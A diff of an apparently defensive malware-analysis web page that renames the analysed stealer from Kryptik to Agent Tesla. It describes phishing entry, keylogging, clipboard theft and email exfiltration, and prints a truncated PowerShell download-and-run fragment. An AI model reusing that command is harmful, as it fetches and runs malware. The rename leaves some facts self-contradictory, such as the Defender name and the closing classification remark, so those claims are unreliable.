@@ -19,7 +19,7 @@
 				}
 				</style>
 	<meta charset="utf-8">
-	<title>Kryptik Malware Analysis</title>
+	<title>Agent Tesla Malware Analysis</title>
 
 	<!-- BootstrapCDN -- >
 	<meta name="viewport" content="width=device-width, initial-scale=1">
@@ -59,7 +59,7 @@
 	<script src="/js/prism.js"></script>
 
 	<div class="jumbotron text-center">
-	  <h1>Kryptik</h1>
+	  <h1>Agent Tesla</h1>
 	  <p>Malware Analysis</p>
 	  <p>August 3rd, 2019</p>
 	</div>
@@ -69,10 +69,12 @@
 	    <div class="col-sm-12">
 	    <a href="https://jessecbrown.com"><----Back to jessecbrown.com</a>
 	      <h3>Abstract</h3>
-	      <p>Recently I was analyzing an interesting Kryptik sample and realized there isn't a lot of writeups on this malware family.
+	      <p>Recently I was analyzing an interesting Agent Tesla sample and thought it would be fun to share some of techniques I observed.
 			The sample I came across seems fairly straight-forward and has some unique characteristics. What follows is my attempt and providing some analysis for the community. </p>
 			<br>
-			<p>Kryptik is an information stealer targeting credentials in browsers, mail clients, and FTP clients. It also has keystroke logging and clipboard data exfiltration capabilities. It uses compromised smtp credentials to send data to the adversary via html email attachments. This malware family is identified by Microsoft Defender as <a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Kryptik&ThreatID=2147727763" target="_blank"></a>Trojan:Win32/Kryptik</a>. At the time of this writing Defender was correctly identifying this sample. </p>
+			<p>Agent Tesla is an information stealer targeting credentials in browsers, mail clients, and FTP clients. It also has keystroke logging and clipboard data exfiltration capabilities. It uses compromised smtp credentials to send data to the adversary via html email attachments. This malware family is identified by Microsoft Defender as <a href="https://www.microsoft.com/en-us/wdsi/threats/malware-encyclopedia-description?Name=Trojan:Win32/Agent Tesla&ThreatID=2147727763" target="_blank"></a>Trojan:Win32/Agent Tesla</a>. At the time of this writing Defender was correctly identifying this sample. </p>
+			<br>
+			<p>KrebsonSecurity has a great <a href="https://krebsonsecurity.com/2018/10/who-is-agent-tesla/" target="_blank">article</a> on the history of the Agent Tesla Malware family from last year. </p>
 			<br>
 			<p>I've tried to structure this write-up around <a href="https://attack.mitre.org/matrices/enterprise/" target="_blank">MITRE's ATTACK framework</a> and provide links to Red Canary's <a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/index.md" target="_blank">Atomic Red Team</a> tests to show defenders how they can detect the TTPs.</p>
 			<br>
@@ -81,7 +83,7 @@
 			<h3>Initial Access</h3>
 				<p>Initial access is achieved through a <a href="https://attack.mitre.org/techniques/T1193/" target="_blank">spearphishing attachment (T1193)</a>. In this case a spoofed DHL shipping notification. With the attached maldoc <code>sp.doc</code>. </p>
 				<br>
-				<img class="img-responsive" src="/analysis/2019/08/kryptik/assets/Kryptikeml.png" alt="Kryptik Email PNG">
+				<img class="img-responsive" src="/analysis/2019/08/Agent Tesla/assets/Agent Teslaeml.png" alt="Agent Tesla Email PNG">
 			<br>
 			<p><b>MITRE Techniques</b></p>
 			<p><a href="https://attack.mitre.org/techniques/T1193/" target="_blank">T1193: spearphishing attachment</a></p>
@@ -278,7 +280,7 @@ cmd.exe /c PowerShell "try{$p=$env:temp+'\Y.exe';Import-Module BitsTransfer;Star
 
 
 			<h3>Collection</h3>
-				<P>Further memory forensics shows Kriptik logging keystrokes and periodically collecting the contents of the clipboard, and these WMI queries to profile the system along with basic information about the system like users, environment variables, etc. </P>
+				<P>Further memory forensics shows Agent Tesla logging keystrokes and periodically collecting the contents of the clipboard, and these WMI queries to profile the system along with basic information about the system like users, environment variables, etc. </P>
 				<pre><code class="language-none">
 SELECT * FROM Win32_VideoController
 SELECT * FROM Win32_Processor
@@ -290,7 +292,7 @@ text/html; name="Flare/FLARE-PC Keystrokes_2019_07_29_19_46_05.html"
 ME-Version: 1.0
 ...
 			</code></pre>
-			<p>The contents of the clipboard are also inserted into an .html document and attached to an email. In this case I had some hex code in my clipboard when Kriptik captured the contents.</p>
+			<p>The contents of the clipboard are also inserted into an .html document and attached to an email. In this case I had some hex code in my clipboard when Agent Tesla captured the contents.</p>
 			<pre><code class="language-none">
 <br><span style=font-style:normal;text-decoration:none;text-transform:none;color:#FF0000;><strong>[clipboard]</strong></span>D0 CF 11 E0 A1 B1 1A E1 00 00 00 00 00 00 00 00
 00 00 00 00 00 00 00 00 3E 00 03 00 FE FF 09 00
@@ -300,7 +302,7 @@ ME-Version: 1.0
 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF
 FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ....
 			</code></pre>
-			<p>Kriptik makes outbound http requests periodically to <code>checkip.amazonaws.com</code></p>
+			<p>Agent Tesla makes outbound http requests periodically to <code>checkip.amazonaws.com</code></p>
 
 			<br>
 			<p><b>MITRE techniques</b></p>
@@ -316,10 +318,10 @@ FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF FF ....
 			<p><a href="https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1056/T1056.md" target="_blank">T1056: Input Capture</a></p>
 
 		<h3>Command and Control</h3>
-			<p>I didn't observe Kriptik receiving commands. However, any new credentials, private keys, public IP addresses, clipboard contents, keystrokes, or system profiling data are regularly sent via email to the adversary. </p>
+			<p>I didn't observe Agent Tesla receiving commands. However, any new credentials, private keys, public IP addresses, clipboard contents, keystrokes, or system profiling data are regularly sent via email to the adversary. </p>
 		
 		<h3>Exfiltration</h3>
-			<p>Kriptik exclusively uses emails with attached .html documents to send data back to the adversary. I happened to have WinSCP installed. So I created a private key to see if the malware would try to send the private key to the adversary. From what I could see it only sent the physical location on disk and the ip address of my ftp server:</p>
+			<p>Agent Tesla exclusively uses emails with attached .html documents to send data back to the adversary. I happened to have WinSCP installed. So I created a private key to see if the malware would try to send the private key to the adversary. From what I could see it only sent the physical location on disk and the ip address of my ftp server:</p>
 				<pre><code class="language-none">
 Time: 07/29/2019 19:41:08<br>UserName: User<br>ComputerName: User-PC<br>OSFullName: Microsoft Windows 7 Professional <br>CPU: Virtual CPU 82d9ed4018dd<br>RAM: 2047.48 MB<br>IP: XXX.XXX.XXX.XXX
 <hr>URL:      XXX.XXX.XXX.XXX:22<br>
@@ -330,7 +332,7 @@ Application: WinSCP<br>
 			
 				<p>Any captured credentials are attached in a document named <code>computer-name Recovered Accounts</code> with the current date and time along with separate attachments for keystroke logs, clipboard contents, and system profiling data. </p>
 				<br>
-				<p>It's likely the credentials this sample of Kryptik used to send the outbound emails were compromised by the adversary and used in this campaign. For that reason I won't be including the username or password in this writeup.</p>
+				<p>It's likely the credentials this sample of Agent Tesla used to send the outbound emails were compromised by the adversary and used in this campaign. For that reason I won't be including the username or password in this writeup.</p>
 		
 				<br>
 				<p><b>MITRE techniques</b></p>
@@ -344,7 +346,7 @@ Application: WinSCP<br>
 		<h3>Final Thoughts</h3>
 			<p>A huge thanks to Didier Stevens for making a fantastic library of OLE analysis tools.</p>
 			<br>
-			<p>At the time of this analysis most of the AV detections on VirusTotal classified this as Kryptik. However, in many ways it closely resembles Agent Tesla without some of the outbound C&C communication. If you have any comments or corrections please get in contact with me!</p>
+			<p>At the time of this analysis most of the AV detections on VirusTotal classified this as Agent Tesla. However, in many ways it closely resembles Agent Tesla without some of the outbound C&C communication. If you have any comments or corrections please get in contact with me!</p>
 			  <br>
 			  <h3>IOCs</h3>
 			  <table style="width:100%">
